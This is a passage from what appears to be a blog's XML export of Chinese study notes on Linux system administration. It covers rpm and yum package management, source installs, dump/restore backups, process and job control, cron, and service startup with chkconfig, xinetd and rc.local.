<li>文件类型<ul>
<li>c：配置文件</li>
<li>d：document，普通文档</li>
<li>g：ghost file，鬼文件，少见，即该文件不应该被此rpm包包含</li>
<li>l：license，授权文件</li>
<li>r：readme，描述文件</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>rpm包中文件提取<ul>
<li>rpm2cpio 包全名 | cpio -idv .文件绝对路径</li>
<li>rpm2cpio：将rpm包转为cpio格式</li>
<li>cpio：一个标准工具，用于创建软件档案文件和从档案文件提取文件<ul>
<li>cpio+选项  &lt;  [文件或设备]</li>
<li>i：copy-in模式，还原</li>
<li>d：还原时自动新建目录</li>
<li>v：显示还原过程</li>
</ul>
</li>
<li>例如<ul>
<li>1，rpm -qf /bin/ls（查询ls命令属于哪个软件包</li>
<li>2，mv /bin/ls /tmp（假装误删除ls命令</li>
<li>3，rpm2cpio 相应包全名 |  cpio -idv ./bin/ls（包由1步骤查询得；提取rpm包中的ls命令到当前目录的/bin/ls下</li>
<li>4，cp /root/bin/ls /bin/（把ls命令复制到/bin/命令，修复其丢失</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>子主题</li>
</ul>
</li>
<li>yum在线管理<ul>
<li>简介<ul>
<li>很好的解决了软件安装时的依赖问题</li>
<li>redhat系列是作为售后服务，需付费；故使用centos，免费</li>
<li>可使用在线yum源，也可以本地光盘搭建</li>
<li>yum实际操作的也是rpm包；可理解为rpm是手动，yum为自动</li>
</ul>
</li>
<li>IP地址配置和网络yum源<ul>
<li>只要接入互联网，不需要配置便可以使用</li>
<li>默认已经配置好官方yum源，可自行更改为国内源</li>
<li>保存位置：/etc/yum.repos.d/CentOS-base.repo</li>
<li>repo后缀名的都是合法的yum源文件<ul>
<li>centos-base.repo：在线的</li>
<li>centos-media.repo：本地光盘的</li>
</ul>
</li>
<li>网络yum源文件内容分析（centos-base.repo<ul>
<li>[base]：容器名称，一定放在[]中（有多个名称不同的容器</li>
<li>name：容器说明，可自定义</li>
<li>mirrorlist：镜像站点，可注释掉</li>
<li>baseurl：yum源服务器的地址，默认国外官方，可改为国内</li>
<li>enabled：此容器是否生效</li>
<li>gpgcheck：若是1指rpm的数字证书生效，0则不生效</li>
<li>gpgkey：数字证书的公钥文件保存位置，不必修改</li>
</ul>
</li>
</ul>
</li>
<li>yum命令<ul>
<li>常用yum命令<ul>
<li>查询<ul>
<li>yum list：查询所有可用软件包列表</li>
<li>yum search+关键字：搜索服务器上所有与关键字相关的包</li>
</ul>
</li>
<li>安装<ul>
<li>yum -y install 包名</li>
<li>install：安装</li>
<li>y：自行回答yes</li>
</ul>
</li>
<li>升级<ul>
<li>yum -y update 包名</li>
<li>不加包名：升级所有软件包，包括内核（内核升级有宕机风险，不建议使用</li>
</ul>
</li>
<li>卸载<ul>
<li>yum -y remove 包名</li>
<li>因具有依赖性，会卸载所有其依赖的包，如a依赖b，卸载a，就会卸载b，但c也依赖b，故会出错</li>
<li>不建议使用卸载功能，有风险</li>
</ul>
</li>
<li>注意<ul>
<li>升级全部、卸载，要慎用，风险极大</li>
</ul>
</li>
</ul>
</li>
<li>yum软件组管理命令<ul>
<li>软件包的集合</li>
<li>yum grouplist：列出所有可用软件组列表</li>
<li>yum groupinstall 软件组名：安装指定软件组，组名可以由grouplist查询出来</li>
<li>yum groupremove 软件组名：卸载指定软件组</li>
</ul>
</li>
</ul>
</li>
<li>本地光盘yum源搭建<ul>
<li>1，挂载光盘<ul>
<li>mount /dev/cdrom /mnt/cdrom/</li>
</ul>
</li>
<li>2，让其它yum源文件失效<ul>
<li>cd /etc/yum.repos.d/</li>
<li>只让centos-media.repo生效<ul>
<li>此repo与本地yum源相关，即光盘yum源</li>
<li>可以将其它更名为.repo.bak，其后缀失效，故文件失效</li>
<li>也可以打开其它文件，更改相关字段，使其失效（太麻烦，不建议</li>
</ul>
</li>
</ul>
</li>
<li>3，修改光盘yum源文件<ul>
<li>将enabled=0改为1，使其生效</li>
<li>baseurl字段改为file:///mnt/cdrom（地址为光盘挂载地址</li>
</ul>
</li>
<li>注意<ul>
<li>Linux中有些配置文件，有其特定格式</li>
<li>不可随便加缩进</li>
<li>有时中间位置也不可加注释，只允许在行首加注释</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="源码包管理"><a href="#源码包管理" class="headerlink" title="源码包管理"></a>源码包管理</h2><ul>
<li>源码包和RPM包的区别<ul>
<li>安装前，考虑二者概念上不同；安装后，考虑的是软件安装位置的不同</li>
<li>RPM包安装位置：系统默认<ul>
<li>/etc：配置文件安装目录</li>
<li>/usr/bin/：可执行命令安装位置</li>
<li>/usr/lib/：程序所使用函数库保存位置</li>
<li>/usr/share/doc/：基本软件使用手册安装位置</li>
<li>/usr/share/man/：帮助文件保存位置</li>
</ul>
</li>
<li>源码包安装位置：手工指定<ul>
<li>安装在指定位置中，一般是/usr/local/软件名/</li>
</ul>
</li>
<li>安装位置不同带来的影响<ul>
<li>1，RPM安装的可使用系统服务管理命令（如service）来管理。如RPM安装的Apache的启动方法：service httpd start或/etc/rc.d/init.d/httpd start（绝对路径来启动）</li>
<li>2，源码包安装的服务不能被服务管理命令管理，因其没有安装到默认路径，所以只能用绝对路径的方式，如/usr/local/apache2/bin/apachectl  start</li>
<li>其它<ul>
<li>归根结底采用绝对路径的方式来启动</li>
<li>service是redhat系列专有，还有其它服务管理命令（都针对rpm安装的）</li>
<li>service命令不能管理源码包安装的，因安装位置的差异</li>
<li>service之所以可操作httpd等，是因为可以到rpm安装的默认目录下寻找相应软件，等效于绝对路径启动软件</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>源码包安装过程<ul>
<li>1，安装准备<ul>
<li>安装C语言编译器</li>
<li>下载源码包</li>
</ul>
</li>
<li>2，安装注意事项<ul>
<li>源码包保存位置：/usr/local/src/（下载保存在此位置</li>
<li>软件安装位置：/usr/local/</li>
<li>如何确定安装过程报错<ul>
<li>安装过程停止（不停止若出现error等，可忽略</li>
<li>并出现error、warning或no的提示</li>
</ul>
</li>
</ul>
</li>
<li>3，安装过程<ul>
<li>下载源码包并解压缩，并进入解压缩的目录<ul>
<li>INSTALL：安装说明文件</li>
<li>README：使用帮助文件</li>
</ul>
</li>
<li>./configure：软件配置与检查<ul>
<li>功能<ul>
<li>定义需要的功能选项</li>
<li>检测系统环境是否符合安装要求</li>
<li>把定义好的功能选项和检测系统环境的信息写入makefile文件，用于后续的编辑</li>
</ul>
</li>
<li>./configure —help：查看所有可支持的配置选项</li>
<li>./configure —prefix=/usr/local/软件名称：定义安装的目录（软件名称可以自定义，前面路径一般不要更改</li>
<li>执行后，生成makefile文件</li>
</ul>
</li>
<li>make<ul>
<li>调用gcc，编译源码包为机器语言</li>
<li>只是编译过程，并未向安装目录正式写入数据</li>
<li>make clean可以清空编译后产生的临时文件，恢复软件包的初始状态（不必重下载</li>
</ul>
</li>
<li>make install<ul>
<li>编译安装过程</li>
<li>开始向安装目录写入数据，正式安装</li>
</ul>
</li>
</ul>
</li>
<li>4，源码包的下载<ul>
<li>不需要卸载命令</li>
<li>直接删除目录即可，不会遗留任何垃圾文件</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="脚本安装包"><a href="#脚本安装包" class="headerlink" title="脚本安装包"></a>脚本安装包</h2><ul>
<li>简介<ul>
<li>脚本安装包并不是独立的软件包类型，常见安装的是源码包</li>
<li>是人为把安装过程写成了自动安装的脚本，只要执行脚本，定义简单的参数，就可完成安装</li>
<li>类似Windows下软件安装方式</li>
</ul>
</li>
<li>以Webmin安装为例（基于web页面的Linux图形操作界面）<ul>
<li>下载解压缩并进入解压缩后目录</li>
<li>执行安装脚本</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>其它</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux-备份与恢复</title>
    <url>/2017/12/25/etc/%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D/</url>
    <content><![CDATA[<h1 id="备份与恢复"><a href="#备份与恢复" class="headerlink" title="备份与恢复"></a>备份与恢复</h1><h2 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h2><ul>
<li>Linux系统需要备份的数据<ul>
<li>/root 目录</li>
<li>/home目录</li>
<li>/var/spool/mail目录<a id="more"></a></li>
<li>/etc目录</li>
<li>其它目录，如日志目录等，自行决定</li>
</ul>
</li>
<li>安装服务的数据<ul>
<li>apache需要备份的数据<ul>
<li>配置文件</li>
<li>网页主目录</li>
<li>日志文件</li>
</ul>
</li>
<li>mysql需要备份的<ul>
<li>源码包安装的mysql：/usr/local/mysql/data</li>
<li>rpm包安装的：/var/lib/mysql</li>
</ul>
</li>
</ul>
</li>
<li>备份的策略<ul>
<li>完全备份<ul>
<li>把所有需要备份的数据全部备份</li>
<li>当然完全备份可以备份整块硬盘，整个分区或者某个具体的目录</li>
<li>备份时慢且占用的空间大，但恢复时方便</li>
</ul>
</li>
<li>增量备份<ul>
<li>只备份新增的</li>
<li>每次的备份量比较少，但恢复比较麻烦</li>
</ul>
</li>
<li>差异备份<ul>
<li>前两种的折中办法</li>
<li>不常使用，知道此概念即可</li>
</ul>
</li>
</ul>
</li>
<li>相关命令<ul>
<li>针对全部备份，完全可以利用压缩、复制命令，结合系统定时任务，shell脚本实现</li>
<li>但是增量备份，写脚本太麻烦，还是使用命令</li>
</ul>
</li>
</ul>
<h2 id="dump命令"><a href="#dump命令" class="headerlink" title="dump命令"></a>dump命令</h2><ul>
<li>默认没有安装，自行安装</li>
<li>dump +选项+备份之后的文件名+原文件或目录</li>
<li>相关选项<ul>
<li>-level，即我们说的0-9这10个备份级别<ul>
<li>直接-数字即可，level即表示数字</li>
<li>0便是完全备份</li>
<li>1是第一次增量备份，2是第二次增量备份…</li>
</ul>
</li>
<li>-f 文件名：指定备份之后的文件名</li>
<li>-u：备份成功后，把备份时间记录在/etc/dumpdates文件</li>
<li>-v：显示备份过程中更多的输出信息</li>
<li>-j：调用bzlib库压缩备份文件，即把备份文件压缩为bz2格式</li>
<li>-W：显示允许被dump的分区的备份等级及备份时间</li>
</ul>
</li>
<li>举例<ul>
<li>备份分区<ul>
<li>dump -0uj -f /root/boot.bak.bz2 /boot/：备份命令，先执行一次完全备份，并压缩和更新备份时间</li>
<li>cat /etc/dumpdates：查看备份时间文件</li>
<li>cp install.log /boot：复制日志文件到boot分区</li>
<li>dump -1uj -f /root/boot.bak.1.bz2 /boot/：增量备份/boot分区并压缩</li>
<li>dump -W ：查询分区的备份时间及备份级别</li>
</ul>
</li>
<li>备份文件或目录<ul>
<li>dump -0j -f /root/etc.dump.bz2 /etc/：完全备份etc目录，知能使用0级别进行完全备份，而不在支持增量备份</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="restore命令"><a href="#restore命令" class="headerlink" title="restore命令"></a>restore命令</h2><ul>
<li>restore + 模式选项+选项</li>
<li>模式选项<ul>
<li>常用模式有四种，且这四种不可混用</li>
<li>-C：比较备份数据和实际数据的变化</li>
<li>-i：进入交互模式，手工选择需要恢复的文件</li>
<li>-t，查看模式，用于查看备份文件中拥有哪些数据</li>
<li>-r，还原模式，用于数据还原</li>
</ul>
</li>
<li>选项<ul>
<li>-f：指定备份文件的文件名</li>
</ul>
</li>
<li>举例<ul>
<li>比较备份数据和实际数据的变化<ul>
<li>先故意更改一实际文件，更改其名字，作为变化</li>
<li>restore -C -f 备份文件：发现上述更改的文件已丢失</li>
</ul>
</li>
<li>查看模式<ul>
<li>restore -t -f boot.bak.bz2</li>
<li>查看此备份的压缩包中含有哪些数据</li>
</ul>
</li>
<li>还原模式<ul>
<li>还原boot.bak.bz2分区备份</li>
<li>先还原完全备份的数据<ul>
<li>mkdir boot.test并cd与此</li>
<li>restore -r -f /root/boot.bak.bz2（解压缩</li>
</ul>
</li>
<li>再恢复增量备份数据<ul>
<li>restore -r -f /root/boot.bak.1.bz2</li>
<li>还原文件时也是如此，后面跟相应文件即可，如前面的etc.dump.bz2</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>其它</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux-系统管理</title>
    <url>/2017/12/25/etc/Linux%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<h1 id="Linux系统管理"><a href="#Linux系统管理" class="headerlink" title="Linux系统管理"></a>Linux系统管理</h1><h2 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h2><ul>
<li>简介<ul>
<li>进程简介<ul>
<li>正在执行的程序或命令</li>
<li>每个进程都是运行实体</li>
<li>有自己地址空间</li>
<li>占用一定系统资源<a id="more"></a></li>
</ul>
</li>
<li>进程管理的作用<ul>
<li>判断服务器健康状态：top</li>
<li>查看系统中所有进程：ps，pstree</li>
<li>杀死进程（正常关闭失效时才考虑）：kill</li>
</ul>
</li>
</ul>
</li>
<li>进程查看<ul>
<li>PS命令：查看所有进程<ul>
<li>ps aux<ul>
<li>查看系统当前所有进程，BSD操作系统格式（即Unix格式</li>
<li>a：所有前台进程</li>
<li>x：所有后台进程</li>
<li>u：进程由哪个用户触发</li>
</ul>
</li>
<li>ps -le<ul>
<li>查看所有进程，Linux标准格式</li>
<li>l：显示详细信息</li>
<li>e：所有进程的意思</li>
</ul>
</li>
<li>输出结果分析<ul>
<li>一条记录为一个进程</li>
<li>USER：当前进程由哪个用户产生</li>
<li>PID：进程ID<ul>
<li>init进程pid为1</li>
<li>所有进程的父进程</li>
</ul>
</li>
<li>%CPU：占用CPU的百分比</li>
<li>%MEM：占用的物理内存百分比</li>
<li>VSZ：占用虚拟内存的大小，单位KB</li>
<li>RSS：占用实际物理内存的大小，单位KB</li>
<li>TTY：是在哪个终端运行的<ul>
<li>很多系统进程的tty为？：表示内核调用</li>
<li>tty1-tty7：本地控制台终端</li>
<li>tty1-tty6:  本地字符界面终端</li>
<li>tty7:本地图形终端</li>
<li>pts/0-256：虚拟终端</li>
<li>ctrl+ alt+ F1/2：切换终端</li>
</ul>
</li>
<li>STAT：进程状态<ul>
<li>R：运行</li>
<li>S：睡眠</li>
<li>T：停止状态</li>
<li>s：包含子进程</li>
<li>+：位于后台</li>
</ul>
</li>
<li>START：进程启动时间</li>
<li>TIME：占用CPU的运行时间，而非系统时间</li>
<li>COMMAND：产生此进程的命令</li>
</ul>
</li>
</ul>
</li>
<li>top命令：判断服务器健康状态<ul>
<li>top 或top -d<ul>
<li>默认三秒刷新</li>
<li>d参数指定top每隔几秒更新</li>
</ul>
</li>
<li>交互模式下可用命名<ul>
<li>？或h：帮助信息</li>
<li>P：以CPU使用率排序，默认</li>
<li>M：以内存使用率排序</li>
<li>N：以pid排序</li>
<li>q：退出top</li>
</ul>
</li>
<li>输出结果分析<ul>
<li>第一行：任务队列信息：top<ul>
<li>系统当前时间</li>
<li>系统已经运行的时间</li>
<li>当前已登录的用户数</li>
<li>系统在之前1分钟、5分钟、15分钟的平均负载<ul>
<li>小于1，负载较小</li>
<li>大于1，超出负荷</li>
<li>判断标准也取决于CPU核数，单核的以1来判断</li>
</ul>
</li>
</ul>
</li>
<li>第二行：进程信息：Tasks<ul>
<li>系统中进程总数</li>
<li>正在运行的进程数</li>
<li>睡眠的进程数</li>
<li>正在停止的进程</li>
<li>僵尸进程<ul>
<li>表示正在终止，但还未终止完全</li>
<li>zombie关键字</li>
<li>如果不是0，需手工检查僵尸进程</li>
</ul>
</li>
</ul>
</li>
<li>第三行：CPU信息：%Cpus<ul>
<li>0.1%us：用户模式占用的CPU百分比</li>
<li>0.1%sy：系统模式占用的CPU百分比</li>
<li>0.0%ni：改变过优先级的用户进程占用的CPU百分比</li>
<li>99.7%id：空闲CPU的占用百分比<ul>
<li>剩余CPU资源</li>
<li>最主要看zhegeq</li>
</ul>
</li>
<li>0.1%wa：等待输入输出的进程的…</li>
<li>%hi：硬中断请求服务占用的…</li>
<li>%si：软中断请求服务占用的…</li>
<li>%st：虚拟时间百分比。当有虚拟机时，虚拟CPU等待实际CPU的时间百分比</li>
</ul>
</li>
<li>第四行：物理内存信息：MeM<ul>
<li>total：物理内存总量，单位KB</li>
<li>used：已使用的</li>
<li>free：空闲的</li>
<li>buffers：作为缓冲的</li>
</ul>
</li>
<li>第五行：交换分区信息：Swap<ul>
<li>total，used，free</li>
<li>cached：作为缓存的交换分区的大小</li>
</ul>
</li>
<li>重点关注<ul>
<li>第一行的平均负载</li>
<li>第三行的CPU剩余</li>
<li>第四行的空闲物理内存</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>pstree：查看进程树<ul>
<li>-p：显示进程PID</li>
<li>-u：显示进程所属用户</li>
</ul>
</li>
</ul>
</li>
<li>终止管理<ul>
<li>kill命令<ul>
<li>kill  [信号]  PID <ul>
<li>按照进程ID杀死进程</li>
<li>常见重启或强制结束，即1或9</li>
</ul>
</li>
<li>kill -l：查看可用的进程信号<ul>
<li>1:SIGHUP：重启进程：立即关闭进程，重新读取配置文件后重启</li>
<li>9:SIGKILL：强制终止进程</li>
<li>15:SIGTERM：正常结束进程，kill的默认信号</li>
</ul>
</li>
<li>杀死单个进程</li>
</ul>
</li>
<li>killall命令<ul>
<li>killall  [选项]  [信号]  进程名<ul>
<li>按照进程名杀死进程</li>
<li>-i：交互式，询问是否杀死某进程</li>
<li>-I：忽略进程名大小写</li>
</ul>
</li>
<li>可按照父进程名杀死多个子进程</li>
</ul>
</li>
<li>pkill命令<ul>
<li>pkill  [选项]  [信号]  进程名<ul>
<li>按照进程名杀死进程</li>
<li>-t：按照终端号踢出用户<ul>
<li>w：查询本机已经登录的用户</li>
<li>pkill  -t -9 pts/1 ：强制杀死从pts/1虚拟终端登录的进程</li>
</ul>
</li>
</ul>
</li>
<li>按照终端号杀死对个进程</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="工作管理"><a href="#工作管理" class="headerlink" title="工作管理"></a>工作管理</h2><ul>
<li>进程可放入后台（类似win最小化<ul>
<li>1，命令后加&amp;<ul>
<li>放入后台依然运行</li>
<li>如tar -zcf etc.tar.gz /etc   &amp;</li>
</ul>
</li>
<li>2，命令执行过程中，按ctrl+z（+c会强制终止）<ul>
<li>放入后台暂停运行</li>
<li>如top命令时</li>
</ul>
</li>
</ul>
</li>
<li>查看后台工作：jobs或jobs -l<ul>
<li>l：显示工作的pid</li>
<li>每条记录的第一个字段为工作号</li>
<li>+：最近一个放入后台的工作，默认优先恢复</li>
<li>-：倒数第二个放入后台的工作，默认第二个恢复</li>
<li>第三个没有+、-等符号</li>
</ul>
</li>
<li>后台暂停的工作恢复到前台执行：fg %工作号<ul>
<li>%工作号：指定要恢复的工作</li>
<li>%可省略</li>
<li>工作号和pid是有区别的</li>
</ul>
</li>
<li>后台暂停的工作恢复到后台执行：bg %工作号<ul>
<li>若此命令是top（等与用户交互的命令），是不能在后台运行的</li>
<li>与用户交互的命名如top，不能在后台运行，会失去其交互的意义，必须在前台运行来与用户交互</li>
<li>如top、vi</li>
</ul>
</li>
</ul>
<h2 id="系统资源查看"><a href="#系统资源查看" class="headerlink" title="系统资源查看"></a>系统资源查看</h2><ul>
<li>vmstat：监控系统资源<ul>
<li>vmstat+刷新延时+刷新次数</li>
<li>如，vmstat 1  3（监控3次，间隔1秒</li>
<li>类似top，但比较简洁</li>
</ul>
</li>
<li>dmesg：显示开机时内核检测信息<ul>
<li>如，dmesg  |  grep CPU</li>
<li>开机时会显示，此命令可再次显示其信息</li>
</ul>
</li>
<li>free：查看内存使用状态<ul>
<li>free -b/k/m/g</li>
<li>b：以字节为单位显示</li>
<li>k：以KB为单位，默认也如此</li>
<li>m：以MB</li>
<li>g：以GB</li>
</ul>
</li>
<li>查看CPU信息<ul>
<li>cat /proc/cpuinfo</li>
<li>或者利用dmesg</li>
</ul>
</li>
<li>uptime命令<ul>
<li>显示系统启用时间和平均负载</li>
<li>top命令的第一行结果</li>
<li>w命令也可看到此数据</li>
</ul>
</li>
<li>uname命令：查看系统和内核信息<ul>
<li>-a：查看系统所有相关信息</li>
<li>-r：查看内核版本</li>
<li>-s：查看内核名称</li>
</ul>
</li>
<li>判断系统当前位数<ul>
<li>file /bin/ls</li>
<li>来间接查看</li>
</ul>
</li>
<li>查询当前系统发行版本<ul>
<li>lsb_release  -a</li>
</ul>
</li>
<li>lsof：列出某进程调用或打开的文件的信息<ul>
<li>-c 字符串：只列出以指定字符串开头的进程打开的…</li>
<li>-u  用户名：只列出某个用户的进程打开的…</li>
<li>-p pid：只列出某个pid进程打开的文件</li>
</ul>
</li>
</ul>
<h2 id="系统定时任务"><a href="#系统定时任务" class="headerlink" title="系统定时任务"></a>系统定时任务</h2><ul>
<li>crond可用于服务管理与访问控制<ul>
<li>一般是启动状态且设置为自启动</li>
<li>services crond restart，利用services启动或重启</li>
</ul>
</li>
<li>用户的crontab设置<ul>
<li>使用前先启动crond服务</li>
<li>crontab + 选项<ul>
<li>-e：编辑crontab定时任务</li>
<li>-l：查询crontab任务</li>
<li>-r：删除当前用户所有的crontab任务（若要删除一个，按e编辑</li>
</ul>
</li>
<li>-e，进入crontab编辑界面<ul>
<li>格式：xxxxx+所执行任务</li>
<li>第一个x：一小时中第几分钟（0-59</li>
<li>第二个x：一天中第几小时（0-23</li>
<li>第三个x：一个月中第几天（1-31</li>
<li>第四个x：一年中第几个月（1-12</li>
<li>第五个x：一周中第几天（0-7，0、7都表示周日</li>
<li>特殊符号<ul>
<li><em>：表任何时间，如第一个为</em>表一小时中每分钟都执行一次</li>
<li>，：表不连续时间，如第二个的8,12,16 表每天的八点、12点、16点执行一次命令</li>
<li>-：代表连续的时间范围，如最后的1-6表示周一到周六</li>
<li><em>/n：表每隔多久执行一次，如第一个的</em>/10表示每隔十分钟执行一遍</li>
</ul>
</li>
<li>其它<ul>
<li>45 22 <em>   </em>   *  + 命令：22点45分执行命令（每天</li>
<li>星期几和每月的第几天最好不要同时出现，易混淆</li>
<li>最小的识别范围为分钟</li>
</ul>
</li>
</ul>
</li>
<li>举例说明<ul>
<li>定时关机或重启</li>
<li>定义执行某自定义脚本，如备份脚本</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>其它</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux-服务管理</title>
    <url>/2017/12/25/etc/%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<h1 id="Linux服务管理"><a href="#Linux服务管理" class="headerlink" title="Linux服务管理"></a>Linux服务管理</h1><h2 id="服务简介与分类"><a href="#服务简介与分类" class="headerlink" title="服务简介与分类"></a>服务简介与分类</h2><ul>
<li>分类：Linux服务<ul>
<li>RPM包默认安装的服务<ul>
<li>独立的服务（</li>
<li>基于xinetd服务（名为超级守护进程，其本身是独立的，其后台会管理其它服务</li>
</ul>
</li>
<li>源码包安装的服务<a id="more"></a></li>
</ul>
</li>
<li>启动与自启动<ul>
<li>服务启动：当前系统运行服务，并提供功能</li>
<li>服务自启动：系统开机或重启时，会自动启动</li>
</ul>
</li>
<li>查询已安装的服务<ul>
<li>RPM包安装的<ul>
<li>chkconfig —list</li>
<li>查看服务自启动状态，可查看到所有RPM包安装的位置</li>
<li>查看七个运行级别的自启动状态，并不是服务当前是否启动（用ps</li>
<li>chkconfig命令不可查看源码包安装的</li>
</ul>
</li>
<li>源码包安装的<ul>
<li>查看服务管理位置，一般是/usr/local/下</li>
<li>不可用命令查询</li>
</ul>
</li>
</ul>
</li>
<li>RPM服务与源码包服务的区别<ul>
<li>安装位置的不同</li>
<li>源码包安装在指定位置，一般为/usr/local/</li>
<li>RPM安装在默认位置</li>
</ul>
</li>
</ul>
<h2 id="RPM包安装服务的管理"><a href="#RPM包安装服务的管理" class="headerlink" title="RPM包安装服务的管理"></a>RPM包安装服务的管理</h2><ul>
<li>独立服务的管理<ul>
<li>RPM会安装在默认位置<ul>
<li>/etc/init.d/：启动脚本的位置（独立安装的</li>
<li>/etc/sysconfig/：初始化环境配置文件目录</li>
<li>/etc/：配置文件位置</li>
<li>etc/xinetd.conf：xinetd配置文件</li>
<li>/etc/xinetd.d/：基于xinetd服务的启动脚本</li>
<li>/var/lib/：服务产生的数据存放至此（var是存放可变数据的目录</li>
<li>/var/log/：日志存放</li>
<li>上述是比较通用的，除此之外，服务也会有其自身的特殊目录</li>
</ul>
</li>
<li>独立服务的启动<ul>
<li>etc/init.d/独立服务名 + start或stop或status或restart<ul>
<li>Linux各发行版本通用，标准启动方法</li>
<li>根据绝对路径来启动是最根本的方法</li>
</ul>
</li>
<li>service + 独立服务名 + start等<ul>
<li>service时redhat系列专有</li>
<li>service会自动到相关目录寻找服务来启动</li>
<li>service —status-all：会列出所有的、rpm安装的、服务的启动状态</li>
</ul>
</li>
</ul>
</li>
<li>独立服务的自启动（建议第2种，其次第1种<ul>
<li>1，chkconfig —level 运行级别 独立服务名 on或off<ul>
<li>如chkconfig —level 2345 httpd on（开启httpd的开机自启</li>
<li>—level 2345可省略（默认选择的运行级别就是2345</li>
<li>只会设置自启，不会打开或关闭当前服务</li>
</ul>
</li>
<li>2，修改/etc/rc.d/rc.local文件<ul>
<li>开机时，所有的指令运行完后，输入密码之前，系统会读取次此文件并执行其内容中的命令</li>
<li>写入文件内容的命令就是启动服务的命令</li>
<li>如，/etc/rc.d/init.d/httpd start</li>
<li>文件第一行，touch /var/lock/subsyslocal，此文件已存在，故不会重新创建，而是改变其访问时间。可以查看其访问时间来确定系统何时启动。</li>
</ul>
</li>
<li>3，使用ntsysv命令管理自启动<ul>
<li>类似于setup命令，用户可更简单操作，同样是redhat专有</li>
<li>也可以操作基于xinetd的服务</li>
<li>不可以操作源码包安装的（所有的服务管理命令都不会操作源码包安装的服务</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>基于xinetd服务的管理（超级守护进程<ul>
<li>0，简介<ul>
<li>xinet管理其它服务，启动时，系统先找到xinetd，再通过它找它管理下的，因此速度较独立的服务会慢一点</li>
<li>基于xinetd的服务呈减少趋势，系统默认不安装</li>
<li>rsync和telnet还会基于xinetd，以telnet为例</li>
<li>远程连接时telnet已被ssh取代，在此仅测试</li>
</ul>
</li>
<li>1，安装xinetd与telnet（yum</li>
<li>2，基于xinetd服务的启动<ul>
<li>vim /etc/xinetd.d/telnet</li>
<li>将disable字段值改为no，即可启动telnet服务</li>
</ul>
</li>
<li>3，重启xinetd服务<ul>
<li>service xinetd restart</li>
<li>xinetd是独立的，可用service操作</li>
<li>重启使更改生效</li>
</ul>
</li>
<li>设置自启动方法<ul>
<li>chkconfig telnet on</li>
<li>ntsysv</li>
<li>注意：基于xinetd服务的，其启动与自启动状态是相等的，改了一个，另一个会随之改变</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="源码包安装服务的管理"><a href="#源码包安装服务的管理" class="headerlink" title="源码包安装服务的管理"></a>源码包安装服务的管理</h2><ul>
<li>源码包安装服务的启动<ul>
<li>使用绝对路径，调用启动脚本来启动</li>
<li>不同源码包的启动脚本不同</li>
<li>可查看源码包的安装说明，查看启动脚本的用法</li>
<li>如，/usr/local/apache2/bin/apachectl start</li>
</ul>
</li>
<li>源码包安装服务的自启动<ul>
<li>vim /etc/rc.d/rc.local</li>
<li>添加一行记录：/usr/local/apache2/bin/apachectl start</li>
</ul>
</li>
<li>让源码包服务被服务管理命令识别<ul>
<li>简介<ul>
<li>默认是不可以的，但手工可以实现</li>
<li>不建议手工更改，易混淆rpm安装的与源码安装的</li>
</ul>
</li>
<li>apache服务被service识别<ul>
<li>建立软链接即可，如ln -s /usr/local/apache2/bin/apachectl    /etc/init.d/apache</li>
<li>此时init.d目录下便出现apache文件，可以通过service来操作</li>
</ul>
</li>
<li>被chkconfig和ntsysv识别（继上被service识别后<ul>
<li>1，vim /etc/init.d/apache</li>
<li>2，添加两行注释<ul>
<li><h1 id="chkconfig：35，86，76"><a href="#chkconfig：35，86，76" class="headerlink" title="chkconfig：35，86，76"></a>chkconfig：35，86，76</h1><ul>
<li>35表运行级别3和5</li>
<li>86、76表启动和关闭顺序，分别表第86个启动和第76个关闭</li>
<li>启动、关闭顺序不能与系统已有服务的相同</li>
<li>cat /etc/rc.d/rc3.d（表第三个运行级别，还有其它六个</li>
<li>rc3.d文件：S01、S02依次启动；K01、K02依次关闭</li>
</ul>
</li>
<li><h1 id="description：值随意写，但必须有此字段"><a href="#description：值随意写，但必须有此字段" class="headerlink" title="description：值随意写，但必须有此字段"></a>description：值随意写，但必须有此字段</h1></li>
</ul>
</li>
<li>3，chkconfig —add apache</li>
<li>被chkconfig识别后不需设置其它，会自动被ntsysv识别</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>Linux服务<ul>
<li>RPM包默认安装的服务<ul>
<li>独立的服务<ul>
<li>启动<ul>
<li>使用/etc/init.d目录中对应脚本来启动</li>
<li>service命令</li>
</ul>
</li>
<li>自启动<ul>
<li>chkconfig命令</li>
<li>修改/etc/rc.d/rc.local文件</li>
<li>使用ntsysv</li>
</ul>
</li>
</ul>
</li>
<li>基于xinetd的服务<ul>
<li>启动<ul>
<li>修改/etc/xinetd.d/目录中配置文件</li>
</ul>
</li>
<li>自启动<ul>
<li>chkconfig命令</li>
<li>使用ntsysv</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>源码包安装的服务<ul>
<li>启动<ul>
<li>使用源码包启动脚本来启动</li>
</ul>
</li>
<li>自启动<ul>
<li>修改/etc/rc.d/rc.local文件</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
